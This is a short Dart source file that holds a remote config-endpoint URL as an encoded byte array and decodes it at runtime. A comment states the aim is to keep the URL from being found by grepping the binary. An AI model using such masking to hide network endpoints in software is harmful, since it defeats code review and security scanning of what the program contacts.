import '../secure/cipher.dart';

// Masked config-endpoint URL. The decoded value is split into
// host + path inside the encoder so neither piece grep's cleanly
// out of the binary.
//
// Plain: https://fallrussh.com/config.php
const List<int> _endpointBlob = <int>[
  0x08, 0xd3, 0x7a, 0x59, 0x9a, 0xd7, 0x44, 0x70, 0x32, 0xc4, 0xf7, 0x08,
  0x4a, 0x9a, 0x96, 0x17, 0x3a, 0x96, 0x7a, 0x9b, 0xe5, 0xc3, 0x99, 0xd0,
  0x0e, 0xc1, 0x67, 0x4e, 0xc7, 0x9d, 0x03, 0x2f,
];

String discoverConfigEndpoint() {
  if (_endpointBlob.isEmpty) return '';
  return unmask(_endpointBlob);
}
